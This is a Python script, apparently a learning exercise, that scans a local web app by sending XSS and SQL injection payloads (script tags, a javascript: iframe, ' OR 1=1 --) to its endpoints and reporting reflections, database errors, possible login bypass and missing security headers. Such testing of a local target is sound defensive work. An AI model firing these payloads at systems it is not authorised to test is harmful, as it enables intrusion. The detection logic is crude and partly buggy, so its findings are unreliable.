import requests

# Target configuration
target = "http://localhost:3000"

# enpoints and injections i decided to try
enpoints = [
    "/", 
    "/rest/products/search", 
    "/rest/user/login", 
    "/api/Feedbacks", 
    "/rest/basket", 
    "/ftp",''
    '/api/Products'
]

injections = [
    ("normal", "apple"),
    ("xss", "<script>alert(1)</script>"),
    ("xss", "<u>test</u>"),
    ("xss", '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'),
    ("sqli", "' OR 1=1 --"),
    ("sqli", "'")
]

def print_header(text):
    print("\n" + "-"*80)
    print(f"{text:^80}")
    print("-"*80)

def run_standalone_detector():
    findings = []
    headers_audited = False

    print(f"Target: {target}")

    for endpoint in enpoints:
        url = f"{target}{endpoint}"
        
        for payload_type, payload_sent in injections:
            # both GET and POST to all enpoints for better detection
            for method in ["GET", "POST"]:
                try:
                    if method == "GET":
                        res = requests.get(url, params={'q': payload_sent}, timeout=5)
                    else:
                        res = requests.post(url, json={"email": payload_sent, "password": payload_sent, "description": payload_sent}, timeout=5)

                    # somthing about headers
                    if not headers_audited:
                        security_headers = {
                            "Content-Security-Policy": "Mitigates XSS missing",
                            "Strict-Transport-Security": "Enforces HTTPS missing",
                            "X-Content-Type-Options": "Prevents sniffing missing"
                        }
                        for header, desc in security_headers.items():
                            if header not in res.headers:
                                findings.append(f"[LOW] MISSING HEADER: {header} ({desc})")
                        
                        # check if we can get server
                        server = res.headers.get("Server")
                        if server:
                            findings.append(f"[INFO] LEAKAGE: Server header reveals '{server}'")
                        headers_audited = True

                    # XSS detection
                    # print(res.text)
                    if payload_type == "xss" and payload_sent in res.text:
                        findings.append(f"[HIGH] XSS DETECTED: {endpoint} reflected {payload_sent} (Method: {method})")

                    # SQL injection detection
                    if payload_type == "sqli":
                        # db error strings
                        db_errors = ["SQLITE_ERROR", "Table not found", "syntax error"]
                        if any(error in res.text for error in db_errors) or res.status_code == 500:
                            findings.append(f"[CRITICAL] SQLi ERROR: {endpoint} flagged via {payload_sent}")
                        # login bypass
                        elif res.status_code == 200 and "/login" in endpoint:
                            findings.append(f"[CRITICAL] SQLi BYPASS: Potential login success at {endpoint}")

                except requests.RequestException as e:
                    print(f"[!] Connection error at {endpoint}: {e}")

    # --- 4. SUMMARY GENERATION (Part 6) ---
    print_header("VULNERABILITY SUMMARY REPORT")
    

    unique_findings = sorted(list(set(findings)))
    if unique_findings:
        for issue in unique_findings:
            print(issue)
    else:
        print("no problems found")
    
    print("-" * 80)
    print(f"number of issues found: {len(unique_findings)}")
    print("-" * 80)

if __name__ == "__main__":
    run_standalone_detector()